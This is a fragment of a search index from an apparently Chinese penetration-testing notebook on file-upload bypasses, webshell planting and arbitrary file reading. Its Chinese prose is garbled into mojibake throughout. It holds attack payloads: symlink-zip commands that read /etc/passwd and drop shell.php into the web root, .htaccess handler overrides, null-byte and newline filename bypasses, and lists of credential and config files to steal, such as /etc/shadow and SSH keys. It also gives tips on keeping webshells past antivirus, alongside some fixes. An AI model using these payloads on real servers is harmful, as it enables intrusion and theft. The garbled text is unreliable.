‡ç­¾è¿›è¡ŒSSRFæ”»å‡» XXEç±»ï¼šdocxï¼Œxlsxï¼Œxlsï¼Œsvgï¼Œxml RCEç±» pharååºåˆ—åŒ– # å›¾ç‰‡å¤„ç† Imagetragickç»„ä»¶æ¼æ´ ImageMagickç»„ä»¶æ¼æ´ SSTIç±»ï¼štpl ç›®å½•ç©¿è¶Šï¼šæ–‡ä»¶è·¯å¾„å¯æ§ åæœï¼šæ–‡ä»¶è¦†ç›–ï¼Œsshå…¬é’¥ï¼Œè®¡åˆ’ä»»åŠ¡ï¼Œè„šæœ¬æ–‡ä»¶ä¸Šä¼ åˆ°å¯æ‰§è¡Œwebç›®å½•ä¸‹.... ffmpeg ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ / SSRF æ¼æ´ https://www.freebuf.com/articles/web/258320.html https://github.com/neex/ffmpeg-avi-m3u-xbin å‹ç¼©åŒ… Linuxè½¯é“¾æ¥ ```shell ä»»æ„æ–‡ä»¶è¯»å– ln -s /etc/passwd test zip -y passwd.zip test # -y ä¿è¯è§£å‹å‡ºæ¥çš„è¿˜æ˜¯è½¯é“¾æ¥ # åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥æŒ‡å‘ç½‘ç«™ç›®å½• ln -s /var/www/html test zip -y 1.zip test # åˆ›å»ºä¸€ä¸ªä¸è½¯é“¾æ¥åŒåçš„ç›®å½•ï¼Œå¹¶åœ¨è¯¥ç›®å½•ä¸‹åˆ›å»ºæœ¨é©¬æ–‡ä»¶ mkdir a && cd a mkdir test echo '' > test/shell.php chmod 777 test/shell.php zip -r 2.zip test ç„¶åå…ˆä¸Šä¼ 1.zipï¼Œè§£å‹å¾—åˆ°è½¯é“¾æ¥testï¼Œå†ä¸Šä¼ 2.zipï¼Œè§£å‹å¾—åˆ°testç›®å½•å’Œshell.phpï¼Œå› ä¸ºtestæŒ‡å‘/var/www/html,æ‰€ä»¥shell.phpå®é™…ä¸Šæ˜¯è¢«è§£å‹åˆ°ç½‘ç«™ç›®å½•ä¸‹ ``` Zip Slipç›®å½•ç©¿è¶Šæ¼æ´ æ‰€æœ‰å·²å‘ç°å—Zip Slipå½±å“çš„é¡¹ç›®:https://github.com/snyk/zip-slip-vulnerability æ³¨ï¼šå¦‚æœç”¨çš„æ˜¯å‘½ä»¤unzipæ¥è§£å‹ï¼Œè¿™ç§æ–¹æ³•å°±æ²¡ç”¨äº†ï¼Œå› ä¸ºunzip é»˜è®¤è·³è¿‡æ–‡ä»¶åä¸­çš„../ æ¼æ´ä¿®å¤ å…³é”® åç¼€åç™½åå•æœºåˆ¶ ä¸Šä¼ çš„æ–‡ä»¶ç»Ÿä¸€æ”¾åˆ°ä¸€ä¸ªåœ°æ–¹ï¼Œéµå¾ªä»¥ä¸‹åŸåˆ™ç›®å½•å¯å†™ä½†ä¸å¯è§£æï¼Œå¯è§£æä½†ä¸å¯å†™å…¥ï¼Œæˆ–è€…ä¸Šä¼ åˆ°ä¸“é—¨ç”¨æ¥ä¿å­˜æ–‡ä»¶çš„åœ°æ–¹ï¼Œå¦‚å­˜å‚¨OSS å¯ç”¨ æ–‡ä»¶å†…å®¹æ ¡éªŒå’Œè¿‡æ»¤ é¿å…æ¡ä»¶ç«äº‰ï¼Œå…ˆåˆ¤æ–­æ˜¯å¦åˆæ³•ï¼Œè€Œä¸æ˜¯å…ˆå°†æ–‡ä»¶å†™å…¥å†åˆ¤æ–­æ˜¯å¦åˆæ³• ä¸Šä¼ æ–‡ä»¶é‡å‘½å éšè—ä¸Šä¼ æ–‡ä»¶è·¯å¾„ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-28 18:56:03 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/02.æ–‡ä»¶æ“ä½œ/æ–‡ä»¶ä¸Šä¼ /02.é»‘åå•ç»•è¿‡.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/02.æ–‡ä»¶æ“ä½œ/æ–‡ä»¶ä¸Šä¼ /02.é»‘åå•ç»•è¿‡.html","title":"02.é»‘åå•ç»•è¿‡","keywords":"","body":"ä¸­é—´ä»¶é…ç½®ä¸å½“ï¼Œå¯¼è‡´å¯ä»¥è§£æå…¶ä»–è„šæœ¬åç¼€ # php .php3 .php4 .php5 .pht .phtml .phar .shtml # .shtml # jsp .jsp .jspa .jsps .jspx # .net .asp .asa .cdx .cer .aspx .asmx .ashx å¯ä»¥ä¸Šä¼ ç›¸å…³é…ç½®æ–‡ä»¶ .htaccess CTF.htaccessçš„ä½¿ç”¨æŠ€å·§æ€»ç»“_.htaccess ctf_Y4tackerçš„åšå®¢-CSDNåšå®¢ åªèƒ½ç”¨äºApache # å½“æ–‡ä»¶åä¸­åŒ…å«shellæ—¶ï¼Œè¯¥æ–‡ä»¶ä¼šè¢«Apacheå½“ä½œphpè§£æ SetHandler application/x-httpd-php #.pngæ–‡ä»¶ä¹Ÿå¯ä»¥æ‰§è¡Œphpç¨‹åº AddType application/x-httpd-php .png # å¼€å¯äº†cgiæ‰©å±•ï¼šæ‰©å±•åä¸º.yyyçš„æ–‡ä»¶ä½œä¸º CGI è„šæœ¬æ¥å¤„ç† Options +ExecCGI AddHandler cgi-script .yyy ä¿®å¤ åœ¨é…ç½®æ–‡ä»¶ä¸­å°†AllowOverride ALLæ”¹ä¸ºAllowOverride None .user.ini ä½¿ç”¨æ¡ä»¶ Apacheå’ŒNginxéƒ½å¯ä»¥ï¼Œåªéœ€æ»¡è¶³ï¼š æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP æœåŠ¡å™¨ä½¿ç”¨CGI FastCGIæ¨¡å¼ ä¸Šä¼ ç›®å½•ä¸‹è¦æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶ payload auto_prepend_file=file_name #è¡¨ç¤ºåœ¨åŠ è½½ç¬¬ä¸€ä¸ªPHPä»£ç ä¹‹å‰å…ˆè¡Œé¢„åŠ è½½è¯¥é…ç½®æ‰€æŒ‡ç¤ºçš„PHPæ–‡ä»¶ã€‚ auto_append_file=file_name #è¡¨ç¤ºåœ¨åŠ è½½ç¬¬ä¸€ä¸ªPHPä»£ç ä¹‹åæ‰§è¡Œé¢„åŠ è½½è¯¥é…ç½®æ‰€æŒ‡ç¤ºçš„PHPæ–‡ä»¶ã€‚ è¿‡æ»¤ä¸å½“ ç‚¹ç»•è¿‡ã€ç©ºæ ¼ç»•è¿‡ã€åç¼€åŒå†™ç»•è¿‡ã€åç¼€å¤§å°å†™ç»•è¿‡ Apacheè§£ææ¼æ´ ä»å³å¾€å·¦è§£ææ¼æ´ äº§ç”ŸåŸå› ï¼š å‰æï¼šphpä½œä¸ºapacheçš„ä¸€ä¸ªå­æ¨¡å—æ¥è¿è¡Œ apacheæ”¯æŒä¸€ä¸ªæ–‡ä»¶æ‹¥æœ‰å¤šä¸ªåç¼€ï¼Œå¹¶ä¸ºä¸åŒåç¼€æ‰§è¡Œä¸åŒçš„æŒ‡ä»¤ï¼Œå¦‚æœè¿ç»´äººå‘˜ç»™.php åç¼€å¢åŠ äº†å¤„ç†å™¨ AddHandler application/x-httpd-php .php Apacheä¼šä»å³å‘å·¦ï¼Œä¾æ¬¡è¯†åˆ«åç¼€ï¼Œç›´åˆ°é‡åˆ°è‡ªå·±èƒ½è§£æçš„æ–‡ä»¶åä¸ºæ­¢ã€‚é‚£ä¹ˆï¼Œåœ¨æœ‰å¤šä¸ªåç¼€çš„æƒ…å†µä¸‹ï¼Œåªè¦ä¸€ä¸ªæ–‡ä»¶å«æœ‰.php åç¼€çš„æ–‡ä»¶å³å°†è¢«è¯†åˆ«æˆ PHP æ–‡ä»¶ã€‚ å‡è®¾ä¸Šä¼ çš„æ–‡ä»¶åä¸º xxxx.php.xyz è¿™æ—¶å€™æœ€åä¸€ä¸ªå¯è¯†åˆ«çš„æ‰©å±•ä¸º.phpï¼Œä¼šå°†å…¶ä½œä¸ºphpæ–‡ä»¶è¿›è¡Œè§£æï¼Œè½»æ¾ç»•è¿‡é»‘ç™½åå•ã€‚ vulhubå¤ç° ![image-20230617172318530](../../../../images/image-20230617172318530.png) æœ¬åœ°cgiæ¨¡å¼å¤ç° HTTPDæ¢è¡Œè§£ææ¼æ´--CVE-2017-15715 äº§ç”ŸåŸå› ï¼š é…ç½®ä¸­çš„æ­£åˆ™ç¼ºé™· SetHandler application/x-httpd-php æ­£åˆ™è¡¨è¾¾å¼ä¸­$ä¸ä»…åŒ¹é…å­—ç¬¦ä¸²ç»“å°¾ä½ç½®ï¼Œä¹Ÿå¯ä»¥åŒ¹é…\\n æˆ– \\rï¼Œä»è€Œå¯¼è‡´å¯ä»¥ä¸Šä¼ .php\\nç»•è¿‡é»‘åå•æ ¡éªŒï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥è¢«ä½œä¸ºPHPæ–‡ä»¶è§£æã€‚ï¼ˆä¸èƒ½æ˜¯.php\\r\\nï¼‰ payload ä¸Šä¼ ï¼š1.php\\x0a è®¿é—®ï¼š1.php%0a ä¸Šè¿°æ¼æ´ä¿®å¤ï¼šå› ä¸ºApacheçš„è§£ææ¼æ´æ˜¯ç”±äºç•¸å½¢æ‰©å±•åå’Œç•¸å½¢æ–‡ä»¶åå¯¼è‡´çš„ï¼Œæ‰€ä»¥ä½¿ç”¨ç™½åå•ï¼Œå¹¶å¯¹æ–‡ä»¶é‡å‘½åï¼Œæ–‡ä»¶å°±ä¸ä¼šå­˜åœ¨ç•¸å½¢å­—ç¬¦å’Œå¤šæ‰©å±•åçš„æƒ…å†µã€‚ å‚è€ƒå¦‚ä¸‹ä»£ç  Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-28 18:40:40 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/02.æ–‡ä»¶æ“ä½œ/æ–‡ä»¶ä¸Šä¼ /03.ç™½åå•ç»•è¿‡.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/02.æ–‡ä»¶æ“ä½œ/æ–‡ä»¶ä¸Šä¼ /03.ç™½åå•ç»•è¿‡.html","title":"03.ç™½åå•ç»•è¿‡","keywords":"","body":"%00æˆªæ–­ æ¡ä»¶ phpç‰ˆæœ¬ magic_quotes_gpcå…³é—­ ä¿å­˜çš„æ–‡ä»¶åå¯æ§ åŸç† if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } åç«¯ä½¿ç”¨move_uploaded_fileæ¥ç§»åŠ¨æ–‡ä»¶ï¼Œmove_uploaded_fileå‡½æ•°åº•å±‚ä¸ºcè¯­è¨€ï¼Œé‡åˆ°0x00ä¼šæˆªæ–­ï¼ˆå­—ç¬¦ä¸²ç»“æŸæ ‡å¿—ï¼‰ Demo $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; move_uploaded_file($temp_file,$img_path)) payload ?save_path=../upload/shell.php%00 filename=shell.jpg è§£ææ¼æ´ IIS 5.x , 6.0 # æ–‡ä»¶å¤¹è§£ææ¼æ´ ä¼šå°† *.asp/ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å½“æˆAspè§£æ 6.0 # åˆ†å·æˆªæ–­æ¼æ´ é»˜è®¤ä¼šå°† *.asp;.jpg æ­¤ç§æ ¼å¼çš„æ–‡ä»¶åï¼Œå½“æˆAspè§£æï¼ŒåŸç†æ˜¯æœåŠ¡å™¨é»˜è®¤ä¸è§£æ; å·åŠå…¶åé¢çš„å†…å®¹ï¼Œç›¸å½“äºæˆªæ–­ã€‚ ä¿®å¤æ–¹æ¡ˆï¼šIISæœåŠ¡å™¨æœ¬èº«ç¼ºé™·ï¼Œå‡çº§ç‰ˆæœ¬/æ‰“è¡¥ä¸ Nginx æ–‡ä»¶ç±»å‹é”™è¯¯è§£ææ¼æ´ï¼ˆIIS7.xç‰ˆæœ¬åœ¨Fast-CGIè¿è¡Œæ¨¡å¼ä¸‹ä¹Ÿå­˜åœ¨ï¼‰ äº§ç”ŸåŸå› ï¼š FastCGIä¸PHPå¯¹PATH_INFOå¤„ç†çš„å·®å¼‚ã€‚ # payload ä¸Šä¼ å›¾ç‰‡ï¼Œè®¿é—®è·¯å¾„/å›¾ç‰‡è·¯å¾„/.php ä¿®å¤ï¼š åœ¨php.iniä¸­è®¾ç½®fix_pathinfo=0 æˆ–è€…è®¾ç½®security.limit_extensions = .php æˆ–è€… åœ¨nginxçš„é…ç½®æ–‡ä»¶ä¸­è®¾ç½®fastcgi_spilt_path_info ^(.+\\.php)(.*)$; ç©ºå­—èŠ‚è§£ææ¼æ´ï¼ˆCVE-2013-4547ï¼‰ å—å½±å“ç‰ˆæœ¬ï¼š0.841~1.4.3/1.5.0~1.5.7 äº§ç”ŸåŸå› ï¼š nginxé…ç½®ä¸å½“ location ~ \\.php$ { } å½“ç”¨æˆ·è¯·æ±‚info.jpg%00.phpæ—¶ï¼Œå› ä¸ºinfo.jpg%00.phpèƒ½å¤ŸåŒ¹é…æ­£åˆ™\".php$\"ï¼Œæ‰€ä»¥å¯ä»¥è¿›å…¥è¯¥locationå—ã€‚ ä½†æ˜¯nginxåœ¨è§£ææ–‡ä»¶åæ—¶è¢«%00æˆªæ–­ï¼Œå¯¼è‡´ä»¥ä¸ºè¯·æ±‚çš„æ–‡ä»¶æ˜¯info.jpgå¹¶å‘ç»™fastcgiï¼Œæ‰€ä»¥fastcgiå°±å°†info.jpgå½“ä½œphpæ–‡ä»¶è¿›è¡Œè§£æäº†ã€‚ # payload ä¸Šä¼ æ–‡ä»¶ï¼šinfo.jpg è¯·æ±‚æ–‡ä»¶ï¼šinfo.jpg%00.php ä¿®å¤ï¼šå‡çº§ç‰ˆæœ¬ PHP é…åˆæ–‡ä»¶åŒ…å« å›¾ç‰‡ğŸ # ç»•è¿‡å®½é«˜æ£€æŸ¥ #define width 1 #define height 1 https://github.com/huntergregal/PNG-IDAT-Payload-Generator ç”¨æ•°æ®é‡å°çš„å›¾ç‰‡ï¼Œæ¯”å¦‚éšä¾¿æˆªä¸€å¼ å¾ˆå°çš„å›¾ æ™®é€šï¼šcopy,ç›´æ¥æ’å…¥ äºŒæ¬¡æ¸²æŸ“ï¼šæ‰¾åˆ°å‰åå›¾ç‰‡ä¸­æ²¡æœ‰å‘ç”Ÿå˜åŒ–çš„hexæ•°æ®ï¼Œæ›¿æ¢ä¸ºæœ¨é©¬ æ–‡ä»¶åŒ…å«trick é…åˆæ–‡ä»¶è¯»å–ååºåˆ—åŒ– ä¸Šä¼ ä»»æ„åç¼€çš„pharæ ¼å¼çš„æ–‡ä»¶ï¼Œé…åˆæ–‡ä»¶è¯»å–ç”¨phar://è§£æ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-28 18:41:16 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/02.æ–‡ä»¶æ“ä½œ/æ–‡ä»¶ä¸Šä¼ /04.WebShellä¸Šä¼ .html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/02.æ–‡ä»¶æ“ä½œ/æ–‡ä»¶ä¸Šä¼ /04.WebShellä¸Šä¼ .html","title":"04.WebShellä¸Šä¼ ","keywords":"","body":"æ–‡ä»¶è·¯å¾„å¯»æ‰¾ From https://www.cnblogs.com/yokan/p/15252077.html å› ä¸ºä¼ ä¸Šå»çš„æ–‡ä»¶ï¼Œå¦‚å›¾ç‰‡è¿™ç±»çš„æ€»å½’æ˜¯æ˜¾ç¤ºå‡ºæ¥çš„ï¼Œæ‰€ä»¥å¯ä»¥å…ˆåœ¨webåº”ç”¨åˆ°å¤„ç‚¹ç‚¹ï¼Œå¤šåŠ è½½ä¸€äº›æ•°æ®åŒ…ï¼Œç„¶åå†åˆ°burpçš„http historyæœç´¢shellçš„åå­— è¿”å›äº†ä¸€äº›å‚æ•°ä½†ä¸åŒ…æ‹¬è·¯å¾„çš„æƒ…å†µï¼Œæ¯”å¦‚file_id ç­‰ç­‰ï¼Œé‚£ä¹ˆæ–‡ä»¶è·¯å¾„å¯èƒ½å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå¯ä»¥ç»“åˆsqlæ³¨å…¥ sqlmapçš„--search -Cå‚æ•°æ‰¾åˆ°å­—æ®µå’Œå€¼ ä»€ä¹ˆéƒ½æ²¡è¿”å›çš„æƒ…å†µï¼Œåªè¿”å›äº†okï¼Œtrueç­‰ç­‰ã€‚é‡æ–°åŠ è½½ï¼ŒæŠ“åŒ…çœ‹å“åº”ï¼Œæˆ–è®¸æŸä¸ªæ¥å£çš„å“åº”å°±åŒ…æ‹¬å¯¹åº”çš„è·¯å¾„ã€‚ æ¯”å¦‚å¤´åƒä½ç½®ä¸Šä¼ ä¸Šå»äº†ï¼Œä½†æ˜¯æ²¡æœ‰è¿”å›è·¯å¾„ï¼Œé‚£ä¹ˆæƒ³åŠæ³•è®©ä»–åœ¨åŠ è½½ä¸€éï¼Œæ¯”å¦‚é€€å‡ºé‡æ–°ç™»é™†ï¼Œä¸€ä¸ªåŒ…ä¸€ä¸ªåŒ…çš„æ”¾ã€‚å¯èƒ½æœ‰äº›åŒ…çš„å“åº”ä¸­å°±åŒ…å«è·¯å¾„ã€‚ å¦å¤–å¯èƒ½å­˜åœ¨å…¶ä»–æœåŠ¡å™¨ã€æˆ–è€…å…¶ä»–ç«™ç‚¹çš„å…¶ä»–è·¯å¾„ï¼Œä¹Ÿæ˜¯æŠ“åŒ…æŸ¥çœ‹ï¼Œçœ‹ä¸€ä¸‹åŠ è½½è¿‡ç¨‹çš„è·¯å¾„åœ¨å“ªæˆ–è€…çœ‹ä¸€ä¸‹htmlã€js [ å°è¯•è®¿é—®æ—¥å¿—æ–‡ä»¶ï¼Œçœ‹èƒ½å¦å‘ç°ä¸€äº›æ•æ„Ÿç›®å½•æˆ–ä¸Šä¼ ç›®å½• åªè¿”å›äº†æ–‡ä»¶åï¼Œæ²¡æœ‰è·¯å¾„ ä¸€ç§æ˜¯fuzzï¼Œçœ‹å…¶ä»–åŒç±»å‹æ–‡ä»¶çš„è·¯å¾„ï¼Œf12æˆ–è€…å¦‚æœæœ‰æ–‡ä»¶ä¸‹è½½çš„åœ°æ–¹ï¼Œä¸‹è½½æŠ“åŒ…ï¼Œçœ‹æ–‡ä»¶åœ°å€ã€‚ å¦ä¸€ç§æ˜¯ å°è¯•ä¸Šä¼ çš„æ—¶å€™ç›®å½•ç©¿è¶Šï¼Œä¸€æ¬¡ä¸€æ¬¡å°è¯•ï¼Œçœ‹èƒ½å¦ç©¿åˆ°ç«™ç‚¹æ ¹ç›®å½•æˆ–è€…çŸ¥é“çš„ç›®å½•ä¸‹é¢ã€‚ä¿®æ”¹è¡¨å•çš„å…¶ä»–å‚æ•°ã€æˆ–è€…filenameå‚æ•°çš„å€¼ WebShellä¸è§£æ è¡¨ç°ï¼šè®¿é—®æ—¶æ–‡ä»¶ç›´æ¥ä¸‹è½½ å°è¯•ç›®å½•ç©¿è¶Šï¼Œè·³åˆ°å¯ä»¥æ‰§è¡Œè„šæœ¬è¯­è¨€çš„ç›®å½• ///../../../ ä»¥///å¼€å¤´æ˜¯å› ä¸ºå¯èƒ½ä¼šè½¬ç ï¼Œå¯¼è‡´å†™å…¥å¤±è´¥ ä¸Šä¼ åå­˜åœ¨å®‰å…¨è®¾å¤‡è¢«åˆ  æ€ä¹ˆåˆ¤æ–­å‘¢ï¼Ÿä¸€èˆ¬æ¥è®²ï¼Œä¸Šä¼ çš„æ—¶å€™ï¼Œéšä¾¿å†™ç‚¹å†…å®¹ï¼ˆä¸ç›´æ¥å†™webshellï¼‰ï¼Œåç¼€æ”¹ä¸ºPHP/JSP/JSPX/ASPX/ASPç­‰ç­‰ï¼Œè®¿é—®ä¸€ä¸‹å¦‚æœåœ¨ï¼Œé‚£ä¹ˆå°±å¯ä»¥è®¤ä¸ºæ˜¯ä¸Šä¼ æˆåŠŸçš„ï¼›æ¥ä¸‹æ¥å†å»ä¸Šä¼ webshell,å¦‚æœè®¿é—®ä¸åˆ°ï¼Œä¸€èˆ¬æƒ…å†µå¯ä»¥è®¤ä¸ºæ˜¯æ€æ¯’ç»™åˆ é™¤äº†ã€‚ å…æ€ é€šä¿¡åŠ å¯† Webshellè¿æ¥å¤±è´¥ è®¿é—®webshellæ˜¯æ²¡é—®é¢˜çš„ï¼Œä½†æ˜¯500é”™è¯¯ä¹‹æµï¼Œwebshellè¿æ¥å·¥å…·ä¹Ÿæ˜¯æ²¡æ³•è¿ä¸Šçš„ï¼ˆè™½ç„¶åƒå†°èå“¥æ–¯æ‹‰éƒ½æ˜¯é€‚é…äº†å¤§éƒ¨åˆ†åœºæ™¯ï¼Œä½†æ˜¯æœ‰äº›å›½äº§åŒ–ä¸­é—´ä»¶è¿˜æ˜¯å­˜åœ¨é€‚é…é—®é¢˜ï¼Œæ¯”å¦‚é‡‘è¶å¤©ç‡•ï¼‰ åå°ä¸Šä¼ éœ€è¦å¸¦Cookieè®¿é—®webshell éœ€è¦å¸¦ä¸ŠæŒ‡å®šçš„Refererå­—æ®µ Trick Fromï¼šä»£ç å®¡è®¡çŸ¥è¯†æ˜Ÿçƒ ä¿®æ”¹å‹ç¼©åŒ…äºŒè¿›åˆ¶å­—èŠ‚ï¼Œè®©å‹ç¼©åŒ…è§£å‹è¿‡ç¨‹å‡ºé”™ï¼Œä½†æ˜¯å‡ºé”™å‰å·²è§£å‹éƒ¨åˆ†å³ä¸ºwebshellã€‚ï¼ˆå‡ºé”™åæ•è·å¼‚å¸¸ï¼Œç¨‹åºä¸­æ­¢ï¼Œå¦‚æœå¼€å‘äººå‘˜æ²¡æœ‰å¯¹å·²è§£å‹éƒ¨åˆ†è¿›è¡Œæ ¡éªŒï¼Œé‚£ä¹ˆå·²è§£å‹å‡ºçš„webshellå°±å¯ä»¥ç•™åœ¨æœåŠ¡ç«¯ä¸­ï¼‰ https://www.leavesongs.com/PENETRATION/after-phpcms-upload-vul.html Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-28 18:56:33 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/02.æ–‡ä»¶æ“ä½œ/æ–‡ä»¶åŒ…å«.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/02.æ–‡ä»¶æ“ä½œ/æ–‡ä»¶åŒ…å«.html","title":"æ–‡ä»¶åŒ…å«","keywords":"","body":"PHPï¼ŒCTF Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-21 15:17:39 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/02.æ–‡ä»¶æ“ä½œ/æ–‡ä»¶è¯»å–å’Œä¸‹è½½.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/02.æ–‡ä»¶æ“ä½œ/æ–‡ä»¶è¯»å–å’Œä¸‹è½½.html","title":"ä»»æ„æ–‡ä»¶è¯»å–å’Œä¸‹è½½","keywords":"","body":"æ¼æ´åŸç† ä¸€äº›ç½‘ç«™ç”±äºä¸šåŠ¡éœ€è¦ï¼Œå¯èƒ½æä¾›æ–‡ä»¶æŸ¥çœ‹æˆ–ä¸‹è½½çš„åŠŸèƒ½ï¼Œå¦‚æœå¯¹ç”¨æˆ·æŸ¥çœ‹æˆ–ä¸‹è½½çš„æ–‡ä»¶ä¸åšé™åˆ¶ï¼Œæ”»å‡»è€…å°±èƒ½å¤Ÿé€šè¿‡å›æº¯ç¬¦../æˆ–ç»å¯¹è·¯å¾„è·³è½¬åˆ°ä»»æ„ç›®å½•æŸ¥çœ‹æˆ–ä¸‹è½½ä»»æ„çš„æ–‡ä»¶ï¼›è¿™å¯èƒ½æ˜¯ä»£ç æºæ–‡ä»¶ï¼Œæ•æ„Ÿé…ç½®æ–‡ä»¶ç­‰ç­‰ï¼Œåœ¨ç‰¹å®šçš„åœºæ™¯ä¸‹ï¼Œè¿˜å¯èƒ½é€ æˆSSRFæ¼æ´ã€‚ å¸¸è§åœºæ™¯ è¯»å–/ä¸‹è½½å›¾ç‰‡ã€æ–‡ä»¶å†…å®¹ï¼› ä¸‹è½½é™„ä»¶ï¼› é¢„è§ˆæ–‡æ¡£ï¼›å¯¼å‡ºæ–‡æ¡£ï¼›ä¿®æ”¹ã€ä¿å­˜æ–‡æ¡£ç­‰ æ¼æ´åˆ©ç”¨ åˆ¤æ–­æ“ä½œç³»ç»Ÿ+æµ‹è¯•æƒé™ | | Win | Linux | | :----: | :----------------: | :---------: | | ä½æƒé™ | C:/windows/win.ini | /etc/hosts | | é«˜æƒé™ | | /etc/shadow | å†™ğŸï¼Œè¯»å–webæºç è¿›è¡Œå®¡è®¡ï¼ˆè·å–Webè·¯å¾„ï¼‰ è¯»å–ä¸­é—´ä»¶é…ç½®æ–‡ä»¶ # Linux /proc/self/environ # å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ /proc/self/cmdline # å¯åŠ¨å½“å‰è¿›ç¨‹æ—¶çš„å‘½ä»¤è¡Œå‚æ•° /proc/self/cwd # æŒ‡å‘å½“å‰è¿›ç¨‹çš„å·¥ä½œç›®å½• /proc/self/exe # æŒ‡å‘å½“å‰è¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ # locateçš„ç´¢å¼•æ•°æ®åº“ /var/lib/mlocate/mlocate.db /var/lib/mlocate.db # ç´¢å¼•ä½¿ç”¨ locate -d db è¦æ‰¾çš„æ–‡ä»¶ åˆ©ç”¨å…¶ä»–æœåŠ¡ æ•°æ®åº“æœåŠ¡ Webç½‘ç«™è¿æ¥æ•°æ®åº“çš„ç›¸å…³æ–‡ä»¶ /etc/redis.conf SSHæœåŠ¡ ç§é’¥ å…¶ä»– # æ•æ„Ÿä¿¡æ¯æ–‡ä»¶ shellå†å²å‘½ä»¤ çˆ†ç ´æ¡Œé¢ä¸Šçš„æ–‡ä»¶ .... /etc/apache2/apache2.conf /etc/apache2/httpd.conf /etc/apache2/ports.conf /etc/apache2/envvars /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-available/default-ssl.conf /etc/apache2/sites-available/000-default-le-ssl.conf /etc/apache2/sites-available/default.conf /etc/apache2/sites-available/ssl.conf /etc/apache2/conf-available/security.conf /etc/apache2/conf-available/charset.conf /var/log/apache2/access.log /var/log/apache2/error.log /var/log/httpd/access_log /var/log/httpd/error_log /etc/nginx/nginx.conf /etc/nginx/conf.d/default.conf /etc/nginx/fastcgi.conf /etc/nginx/proxy.conf /etc/nginx/conf.d/ssl.conf /etc/nginx/sites-available/default.conf /usr/local/tomcat/conf/server.xml /usr/local/tomcat/conf/web.xml /usr/local/tomcat/conf/tomcat-users.xml ä¸­é—´ä»¶ é…ç½® æ–‡ä»¶ç›®å½• ä¸»é…ç½®æ–‡ä»¶ ç½‘ç«™ç›®å½• æ—¥å¿—ç›®å½• nginx /etc/nginx/ nginx.conf /usr/share/nginx/html/ /var/log/nginx/ apache apache2.conf /var/www/html/ /var/log/apache2/ tomcat /usr/local/tomcat/conf å¦‚ä¸‹å›¾ /usr/local/tomcat/webapps /usr/local/tomcat/log javaç«™ç‚¹ /WEB-INF/web.xml /WEB-INF/classes/applicationContext.xml /WEB-INF/classes/xxx/xxx/xxx.class core.jar å¦‚æœé‡åˆ°Shiroç«™ç‚¹ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨å…¨è·¯å¾„æ‰¾åˆ°core.jarï¼Œå»ä¸‹è½½core.jarï¼Œä¸‹è½½ååç¼–è¯‘æœç´¢Base64.decodeç›´æ¥æ‰¾keyï¼Œè¿›è€Œgetshell Linux /etc ç³»ç»Ÿé…ç½®æ–‡ä»¶ç›®å½• /etc/passwd è®°å½•ç”¨æˆ·ä¿¡æ¯ [root@izwz99bgx9y93dmv0mir0ez ~]# cat /etc/passwd root:x:0:0:root:/root:/bin/bash ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin tcpdump:x:72:72::/:/sbin/nologin .... å…è®¸ç™»å…¥çš„shellå°±æ˜¯/bin/bashç¦æ­¢shellç™»å…¥å°±æ˜¯/sbin/nologin æ ¼å¼è§£æ ä»¥:ä½œä¸ºåˆ†éš”ç¬¦ ç™»å½•å:åŠ å¯†çš„å£ä»¤:UID:GID:ç”¨æˆ·ä¿¡æ¯:ç”¨æˆ·ç›®å½•:ç”¨æˆ·ç™»é™†åä½¿ç”¨çš„shell ä¸ºä»€ä¹ˆæœ‰äº›ç™»å½•åæ˜¯æœåŠ¡è¿›ç¨‹åï¼Ÿ Linuxç³»ç»Ÿä¼šä¸ºå„ç§å„æ ·çš„åŠŸèƒ½åˆ›å»ºä¸åŒçš„ç”¨æˆ·è´¦æˆ·ï¼Œè€Œè¿™äº›è´¦æˆ·å¹¶ä¸æ˜¯çœŸçš„ç”¨æˆ·ã€‚ è¿™äº›è´¦æˆ·å«ä½œç³»ç»Ÿè´¦æˆ·ï¼Œæ˜¯ç³»ç»Ÿä¸Šè¿è¡Œçš„å„ç§æœåŠ¡è¿›ç¨‹è®¿é—®èµ„æºç”¨çš„ç‰¹æ®Šè´¦æˆ·ã€‚ æ¯”å¦‚ä¸Šè¿°çš„ftpï¼Œtcpdumpã€‚ ä¸ºä»€ä¹ˆè¦è¿™æ ·åšï¼Ÿ 